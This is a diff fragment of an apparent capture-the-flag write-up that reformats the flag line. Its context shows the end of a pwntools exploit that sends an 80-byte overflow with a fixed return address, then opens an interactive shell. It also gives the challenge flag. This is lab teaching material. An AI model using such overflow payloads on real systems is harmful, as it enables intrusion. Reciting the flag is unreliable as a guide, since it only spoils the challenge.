@@ -32,4 +32,4 @@ conn.sendlineafter("name:", b'a' * 80 + p32(0x08048506))
 conn.interactive()
 ```
 
-Flag: `HCMUS-CTF{overwrite_all_the_things}`
+**Flag:** `HCMUS-CTF{overwrite_all_the_things}`
